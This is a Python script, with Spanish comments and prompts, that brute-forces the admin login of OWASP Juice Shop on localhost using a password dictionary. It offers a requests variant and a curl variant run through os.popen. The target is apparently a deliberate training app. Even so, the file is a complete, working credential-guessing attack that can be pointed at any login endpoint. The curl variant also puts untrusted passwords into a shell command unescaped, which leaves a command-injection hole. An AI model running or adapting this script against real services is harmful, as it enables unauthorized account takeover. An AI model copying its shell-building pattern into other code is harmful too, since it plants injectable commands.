import os
import requests
import json

def brute_force_with_requests(password_list_file):
    """
    Versión usando la librería requests (recomendada)
    """
    url = "http://localhost:3000/rest/user/login"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'Origin': 'http://localhost:3000',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:3000/',
        'Cookie': 'language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=1OzBZxNpnLrM5WmgEKv8XakQ7DA6gJuVbdJ6yOlV9Pow1jYqbz2eRB34oE5m',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'DNT': '1',
        'Sec-GPC': '1',
        'Priority': 'u=0'
    }
    
    # Verificar que el archivo existe
    if not os.path.exists(password_list_file):
        print(f"Error: El archivo '{password_list_file}' no existe")
        return None
    
    print(f"Cargando diccionario: {password_list_file}")
    
    with open(password_list_file, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = f.readlines()
    
    print(f"Total de contraseñas a probar: {len(passwords)}")
    print("Iniciando ataque de fuerza bruta...")
    print("-" * 50)
    
    for i, password in enumerate(passwords, 1):
        password = password.strip()  # Elimina \n y espacios
        if not password:  # Salta líneas vacías
            continue
            
        data = {
            "email": "admin@juice-sh.op",
            "password": password
        }
        
        print(f"[{i}/{len(passwords)}] Probando contraseña: {password}")
        
        try:
            response = requests.post(url, headers=headers, json=data, timeout=10)
            
            # Verifica si el login fue exitoso
            if response.status_code == 200:
                response_data = response.json()
                if 'authentication' in response_data or 'token' in response_data:
                    print(f"\n{'#' * 60}")
                    print(f"¡CONTRASEÑA ENCONTRADA!: {password}")
                    print(f"Respuesta del servidor: {response_data}")
                    print(f"{'#' * 60}")
                    return password
                else:
                    print(f"  Falló: {password}")
            else:
                print(f"  Error HTTP {response.status_code} para: {password}")
                
        except requests.exceptions.RequestException as e:
            print(f"  Error de conexión con {password}: {e}")
    
    print("-" * 50)
    print("No se encontró la contraseña en el diccionario")
    return None

def brute_force_with_curl(password_list_file):
    """
    Versión usando curl (como en tu código original)
    """
    # Verificar que el archivo existe
    if not os.path.exists(password_list_file):
        print(f"Error: El archivo '{password_list_file}' no existe")
        return
    
    print(f"Cargando diccionario: {password_list_file}")
    
    with open(password_list_file, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = f.readlines()
    
    print(f"Total de contraseñas a probar: {len(passwords)}")
    print("Iniciando ataque de fuerza bruta...")
    print("-" * 50)
    
    for i, password in enumerate(passwords, 1):
        password = password.strip()
        if not password:
            continue
            
        print(f"[{i}/{len(passwords)}] Probando contraseña: {password}")
        
        # Construye el comando curl
        curl_command = f"""curl -s 'http://localhost:3000/rest/user/login' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://localhost:3000' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://localhost:3000/' \
  -H 'Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=1OzBZxNpnLrM5WmgEKv8XakQ7DA6gJuVbdJ6yOlV9Pow1jYqbz2eRB34oE5m' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0' \
  --data-raw '{{"email":"admin@juice-sh.op","password":"{password}"}}'"""
        
        # Ejecuta el comando y captura la salida
        result = os.popen(curl_command).read()
        if 'token' in result or 'authentication' in result:
            print(f"\n{'#' * 60}")
            print(f"¡CONTRASEÑA ENCONTRADA!: {password}")
            print(f"Respuesta del servidor: {result}")
            print(f"{'#' * 60}")
            return password

def main():
    """
    Función principal que pide la ruta del diccionario
    """
    print("=== FUERZA BRATA AUTOMATIZADA ===")
    print()
    
    # Pedir la ruta del diccionario
    ruta_diccionario = input("Introduce la ruta del archivo de contraseñas: ").strip()
    
    # Si no se introduce nada, usar por defecto
    if not ruta_diccionario:
        ruta_diccionario = "input.txt"
        print(f"Usando archivo por defecto: {ruta_diccionario}")
    
    print()
    print("Selecciona el método:")
    print("1. Usar requests (recomendado - más rápido)")
    print("2. Usar curl (similar al original)")
    
    opcion = input("Elige una opción (1/2): ").strip()
    
    print()
    if opcion == "1":
        print("Ejecutando con requests...")
        found_password = brute_force_with_requests(ruta_diccionario)
    elif opcion == "2":
        print("Ejecutando con curl...")
        found_password = brute_force_with_curl(ruta_diccionario)
    else:
        print("Opción no válida. Usando requests por defecto.")
        found_password = brute_force_with_requests(ruta_diccionario)
    
    # Mostrar resultado final
    print()
    print("=" * 50)
    if found_password:
        print(f"✅ ¡ATAQUE EXITOSO! Contraseña encontrada: {found_password}")
    else:
        print("❌ Ataque completado - Contraseña no encontrada")
    print("=" * 50)

if __name__ == "__main__":
    main()